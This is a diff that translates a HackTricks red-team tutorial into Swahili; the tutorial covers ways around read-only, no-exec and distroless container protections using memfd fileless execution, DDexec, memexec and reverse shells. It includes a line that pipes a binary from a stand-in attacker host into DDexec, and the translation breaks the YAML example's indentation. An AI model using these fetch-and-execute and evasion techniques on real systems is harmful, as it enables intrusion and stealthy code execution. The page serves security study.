@@ -1,87 +1,85 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Kupita ulinzi wa FS: soma tu / hakuna-kutekelezwa / Distroless
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-## Videos
+## Video
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:
+Katika video zifuatazo unaweza kupata maelezo zaidi juu ya mbinu zilizotajwa kwenye ukurasa huu:
 
-* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - Kuchunguza Ubadilishaji wa Kumbukumbu ya Linux kwa Upelelezi na Kuepuka**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**Uvamizi wa siri na DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## read-only / no-exec scenario
+## Skena ya soma tu / hakuna-kutekelezwa
 
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+Inazidi kuwa kawaida kupata mashine za linux zilizounganishwa na **ulinzi wa mfumo wa faili wa soma tu (ro)**, haswa kwenye vyombo. Hii ni kwa sababu kuendesha chombo na mfumo wa faili wa soma tu ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** kwenye `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+Hata hivyo, hata ikiwa mfumo wa faili umefungwa kama soma tu, **`/dev/shm`** bado itakuwa inaweza kuandikwa, kwa hivyo sio kweli hatuwezi kuandika chochote kwenye diski. Walakini, saraka hii itakuwa **imefungwa na ulinzi wa hakuna-kutekelezwa**, kwa hivyo ikiwa unapakua faili ya binary hapa, **hutaweza kuitekeleza**.
 
 {% hint style="warning" %}
-From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+Kutoka kwa mtazamo wa timu nyekundu, hii inafanya kuwa **ngumu kupakua na kutekeleza** faili za binary ambazo hazipo tayari kwenye mfumo (kama backdoors au watafutaji kama `kubectl`).
 {% endhint %}
 
-## Easiest bypass: Scripts
+## Kupita kwa urahisi: Scripts
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+Tafadhali kumbuka kuwa nilitaja faili za binary, unaweza **kutekeleza skripti yoyote** ikiwa tu msindikaji yupo ndani ya mashine, kama **skripti ya shell** ikiwa `sh` iko au **skripti ya python** ikiwa `python` imefungwa.
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+Hata hivyo, hii pekee haitoshi kuendesha faili yako ya binary backdoor au zana nyingine za binary ambazo unaweza kuhitaji kuendesha.
 
-## Memory Bypasses
+## Kupita kwa Kumbukumbu
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+Ikiwa unataka kutekeleza faili ya binary lakini mfumo wa faili haikuruhusu hilo, njia bora ya kufanya hivyo ni kwa **kuitekeleza kutoka kumbukumbu**, kwani **ulinzi hauna athari huko**.
 
-### FD + exec syscall bypass
+### Kupita kwa FD + exec syscall
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
+Ikiwa una injini za skripti yenye nguvu ndani ya mashine, kama vile **Python**, **Perl**, au **Ruby**, unaweza kupakua faili ya binary ili kuitekeleza kutoka kumbukumbu, kuichukua na kuweka kwenye maelezo ya faili ya kumbukumbu (`create_memfd` syscall), ambayo hayatalindwa na ulinzi huo na kisha kuita **syscall ya exec** ikionyesha **fd kama faili ya kutekeleza**.
 
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
+Kwa hili unaweza kutumia mradi [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kumpitisha faili ya binary na itazalisha skripti kwa lugha iliyotajwa na **binary iliyopunguzwa na kubadilishwa kuwa msimbo wa b64** pamoja na maagizo ya **kudecode na kufuta kubadilisha** kwenye **fd** iliyoundwa kwa kuita syscall ya `create_memfd` na wito wa syscall ya **exec** kuikimbia.
 
 {% hint style="warning" %}
-This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
+Hii haifanyi kazi kwenye lugha zingine za skripti kama PHP au Node kwa sababu hawana njia yoyote ya msingi ya kuita syscalls za moja kwa moja kutoka kwenye skripti, kwa hivyo haiwezekani kuita `create_memfd` kuunda **fd ya kumbukumbu** kuhifadhi faili ya binary.
 
-Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
+Zaidi ya hayo, kuunda **fd ya kawaida** na faili katika `/dev/shm` haitafanya kazi, kwani hautaruhusiwa kuikimbia kwa sababu ya **ulinzi wa hakuna-kutekelezwa** utatumika.
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni mbinu inayokuwezesha **kurekebisha kumbukumbu ya mchakato wako mwenyewe** kwa kubadilisha **`/proc/self/mem`** yake.
 
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
+Kwa hivyo, **kudhibiti msimbo wa mkutano** unaotekelezwa na mchakato, unaweza kuandika **shellcode** na "kubadilisha" mchakato ili **kutekeleza msimbo wowote wa aina yoyote**.
 
 {% hint style="success" %}
-**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
+**DDexec / EverythingExec** itakuruhusu kupakia na **kutekeleza** msimbo wako mwenyewe wa **shellcode** au **binary yoyote** kutoka **kumbukumbu**.
 {% endhint %}
-
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
+Kwa habari zaidi kuhusu mbinu hii angalia Github au:
 
 {% content-ref url="ddexec.md" %}
 [ddexec.md](ddexec.md)
@@ -89,54 +87,54 @@ For more information about this technique check the Github or:
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) ni hatua inayofuata ya asili ya DDexec. Ni **DDexec shellcode demonised**, kwa hivyo kila wakati unapotaka **kuendesha binary tofauti** hauitaji kuzindua DDexec tena, unaweza tu kuendesha shellcode ya memexec kupitia mbinu ya DDexec na kisha **kuwasiliana na deamon hii ili kupitisha binaries mpya za kupakia na kuendesha**.
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Unaweza kupata mfano wa jinsi ya kutumia **memexec kuendesha binaries kutoka kwa PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+Kwa lengo kama la DDexec, mbinu ya [**memdlopen**](https://github.com/arget13/memdlopen) inaruhusu njia rahisi ya kupakia binaries kwenye kumbukumbu ili kuziendesha baadaye. Inaweza hata kuruhusu kupakia binaries na tegemezi.
 
-## Distroless Bypass
+## Kupitisha Distroless
 
-### What is distroless
+### Ni nini distroless
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Vyombo vya distroless vina **vipengele vichache sana vinavyohitajika kuendesha programu au huduma maalum**, kama maktaba na tegemezi za runtime, lakini havijumuishi vipengele vikubwa kama meneja wa pakiti, shell, au zana za mfumo.
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Lengo la vyombo vya distroless ni **kupunguza eneo la shambulio la vyombo** kwa kuondoa vipengele visivyohitajika na kupunguza idadi ya udhaifu ambao unaweza kutumiwa.
 
 ### Reverse Shell
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+Katika chombo cha distroless unaweza **hata usipate `sh` au `bash`** kupata shell ya kawaida. Pia hutapata binaries kama vile `ls`, `whoami`, `id`... kila kitu ambacho kawaida unakimbia kwenye mfumo.
 
 {% hint style="warning" %}
-Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+Kwa hivyo, hautaweza kupata **reverse shell** au **kuchunguza** mfumo kama kawaida.
 {% endhint %}
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
+Hata hivyo, ikiwa chombo kilichoharibiwa kinatumia mfumo wa flask kwa mfano, basi python imewekwa, na kwa hivyo unaweza kupata **Python reverse shell**. Ikiwa inatumia node, unaweza kupata Node rev shell, na vivyo hivyo na **lugha nyingine za scripting**.
 
 {% hint style="success" %}
-Using the scripting language you could **enumerate the system** using the language capabilities.
+Kwa kutumia lugha ya scripting unaweza **kuchunguza mfumo** kwa kutumia uwezo wa lugha hiyo.
 {% endhint %}
 
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+Ikiwa hakuna ulinzi wa **`read-only/no-exec`**, unaweza kutumia reverse shell yako kudanganya mfumo wa faili na **kuendesha** binaries.
 
 {% hint style="success" %}
-However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+Hata hivyo, katika vyombo kama hivi, ulinzi huu kawaida utakuwepo, lakini unaweza kutumia **mbinu za utekelezaji wa kumbukumbu za awali kuzipita**.
 {% endhint %}
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Unaweza kupata **mifano** ya jinsi ya **kutumia baadhi ya udhaifu wa RCE** kupata **reverse shells** za lugha za scripting na kuendesha binaries kutoka kwenye kumbukumbu katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Njia nyingine za kusaidia HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
